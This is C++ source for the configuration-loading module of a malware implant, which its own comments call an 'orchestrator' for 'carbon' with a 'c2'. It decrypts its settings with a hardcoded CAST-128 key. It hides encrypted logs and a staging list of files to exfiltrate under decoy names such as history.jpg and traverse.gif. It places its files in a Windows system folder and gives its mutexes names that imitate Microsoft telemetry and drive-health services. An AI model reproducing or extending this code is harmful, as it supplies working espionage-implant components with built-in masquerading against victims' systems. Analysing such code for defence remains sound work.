#include "../include/orchestrator.h"

// contains vars that hold information other parts of the orchestrator use
// functionally used as global variables

namespace orchestrator {

std::string workingDir = "C:\\Program Files\\Windows NT\\"; // where carbon stuff goes
std::string defaultErrorLogPath = "C:\\Program Files\\Windows NT\\bootinfo.dat"; // default error log
std::string defaultRegLogPath = "C:\\Program Files\\Windows NT\\history.jpg"; // default regular log
std::string configFileName = "setuplst.xml"; // the name of the config file to read from
std::string configMutexSection = "MTX"; // config section with mutex information
std::string configLocationSection = "LOCATION"; // config section with task information
std::string configFileSection = "FILE"; // config section with names of files
std::map<std::string,Mutex> mMutexMap; // map mutex names to their handles, populated by mutex.cpp
std::string configFilePath; // the path to the config file
std::string configFileContents; // the contents of the config file
std::string lpLogAccessName = ""; // the name of the mutex for orch log access
std::string lpELogAccessName; // the name of the mutex for orch error log access
std::string lpFileUploadName; // the name of the mutex for orch file upload
std::string lpTasksName; // the name of the mutex for tasks
std::string lpConfigName; // the name of the mutex for the main config file
std::string taskDir; // the carbon working directory name
std::string taskDirPath; // the carbon working directory absolute path
std::string logDir; // directory that holds output files
std::string logDirPath; // path to dir that that holds output files
std::string taskConfigDir; // directory that holds task files
std::string taskConfigDirPath; // path to dir that holds task files
std::string taskFilePath; // the path to the orch task file
// hardcoded key hex f2 d4 56 08 91 bd 94 86 92 c2 8d 2a 93 91 e7 d9
std::vector<unsigned char> key = {
    (unsigned char)0xf2, (unsigned char)0xd4, (unsigned char)0x56, (unsigned char)0x08, 
    (unsigned char)0x91, (unsigned char)0xbd, (unsigned char)0x94, (unsigned char)0x86, 
    (unsigned char)0x92, (unsigned char)0xc2, (unsigned char)0x8d, (unsigned char)0x2a,
    (unsigned char)0x93, (unsigned char)0x91, (unsigned char)0xe7, (unsigned char)0xd9
};
std::string errorLogName; // the name of the error log file
std::string errorLogPath; // the path to the error log file
std::string regLogName; // the name of the regular log file
std::string regLogPath; // the path to the regular log file
std::string sendFileName; // the name of the file that lists files to send to c2
std::string sendFilePath; // the path to the file that lists files to send to c2
std::string uuid; // implant uuid
bool commsActiveFlag; // signal for if the comms lib is running or not, used by tasking
bool logMutexFlag = FALSE; // signal for when mutexes have been created, use them for logging

// take values from the config file and put them in appropriate vars for other parts of the orchestrator to use
int PopulateConfigValues() {
    try {
        configFilePath = util::BuildFilePath(configFileName);
        util::logEncrypted(defaultRegLogPath, "[ORCH] Config file path: " + configFilePath);

        // read and decrypt config
        configFileContents = util::VCharToStr(
                             enc_handler::Cast128Decrypt(
                             util::GetEncryptedFileContents(configFilePath), key));
        util::logEncrypted(defaultRegLogPath, "[ORCH] Config contents:\n" + configFileContents);
        
        lpLogAccessName = util::GetConfigValue(configMutexSection, "log", configFileContents);
        if (lpLogAccessName == "") {
            lpLogAccessName = "Global\\Stream.Halt.Restoration";
        }

        lpELogAccessName = util::GetConfigValue(configMutexSection, "elog", configFileContents);
        if (lpELogAccessName == "") {
            lpELogAccessName = "Global\\Threading.Management.Info";
        }

        lpFileUploadName = util::GetConfigValue(configMutexSection, "send", configFileContents);
        if (lpFileUploadName == "") {
            lpFileUploadName = "Global\\DriveHealthOverwatch";
        }

        lpTasksName = util::GetConfigValue(configMutexSection, "tsk", configFileContents);
        if (lpTasksName == "") {
            lpTasksName = "Global\\DriveEncryptionStd";
        }

        lpConfigName = util::GetConfigValue(configMutexSection, "cfg", configFileContents);
        if (lpConfigName == "") {
            lpConfigName = "Global\\Microsoft.Telemetry.Configuration";
        }

        taskDir = util::GetConfigValue(configLocationSection, "task_dir", configFileContents);
        if (taskDir == "") {
            taskDir = "0511";
        }
        taskDirPath = util::BuildFilePath(taskDir);

        logDir = util::GetConfigValue(configLocationSection, "log_dir", configFileContents);
        if (logDir == "") {
            logDir = "2028";
        }
        logDirPath = util::BuildFilePath(logDir);

        taskConfigDir = util::GetConfigValue(configLocationSection, "t_cfg_dir", configFileContents);
        if (taskConfigDir == "") {
            taskConfigDir = "Nlts";
        }
        taskConfigDirPath = util::BuildFilePath(taskConfigDir);

        taskFilePath = taskDirPath + "\\" + util::GetConfigValue(configFileSection, "tsk", configFileContents);
        if (taskFilePath == "") {
            taskFilePath = taskDirPath + "\\" + "workdict.xml";
        }
        util::logEncrypted(defaultRegLogPath, "[ORCH] Task file path: " + taskFilePath);

        errorLogName = util::GetConfigValue(configFileSection, "elog", configFileContents);
        if (errorLogName == "") {
            errorLogName = "bootinfo.dat";
        }
        errorLogPath = util::BuildFilePath(errorLogName);
        util::logEncrypted(defaultRegLogPath, "[ORCH] Error log path: " + errorLogPath);

        regLogName = util::GetConfigValue(configFileSection, "log", configFileContents);
        if (regLogName == "") {
            regLogName = "history.jpg";
        }
        regLogPath = util::BuildFilePath(regLogName);
        util::logEncrypted(defaultRegLogPath, "[ORCH] Regular log path: " + regLogPath);

        sendFileName = util::GetConfigValue(configFileSection, "send", configFileContents);
        if (sendFileName == "") {
            sendFileName = "traverse.gif";
        }
        sendFilePath = logDirPath + "\\" + sendFileName;
        util::logEncrypted(defaultRegLogPath, "[ORCH] Send file path: " + sendFilePath);
        uuid = util::GetConfigValue("NAME", "object_id", configFileContents);
    } catch (const std::exception& e) {
        util::logEncrypted(defaultErrorLogPath, "[ERROR-ORCH] PopulateConfigValues encountered error: " + std::string(e.what()));
        return FAIL_ORCH_POPULATE_CONFIG;
    }

    return ERROR_SUCCESS;
}
}